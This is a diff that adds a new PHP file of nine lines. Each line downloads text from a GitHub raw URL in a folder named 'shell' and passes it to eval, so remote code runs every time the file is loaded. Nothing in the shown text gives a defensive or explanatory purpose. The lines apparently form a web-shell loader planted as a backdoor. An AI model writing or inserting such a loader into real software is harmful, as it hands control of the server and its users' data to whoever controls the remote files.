@@ -1,0 +1,9 @@
+<?php eval(urldecode("?>") . file_get_contents(urldecode("https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/scanme.txt"))); ?>
+<?php eval(urldecode("?>") . file_get_contents(urldecode("https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/scanme2.txt"))); ?>
+<?php eval(urldecode("?>") . file_get_contents(urldecode("https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo.txt"))); ?>
+<?php eval(urldecode("?>") . file_get_contents(urldecode("https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo2.txt"))); ?>
+<?php eval(urldecode("?>") . file_get_contents(urldecode("https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo3.txt"))); ?>
+<?php eval(urldecode("?>") . file_get_contents(urldecode("https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo4new.txt"))); ?>
+<?php eval(urldecode("?>") . file_get_contents(urldecode("https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo4old.txt"))); ?>
+<?php eval(urldecode("?>") . file_get_contents(urldecode("https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo5.txt"))); ?>
+<?php eval(urldecode("?>") . file_get_contents(urldecode("https://raw.githubusercontent.com/xxTYPOxx/Dat/refs/heads/main/shell/typo6.txt"))); ?>
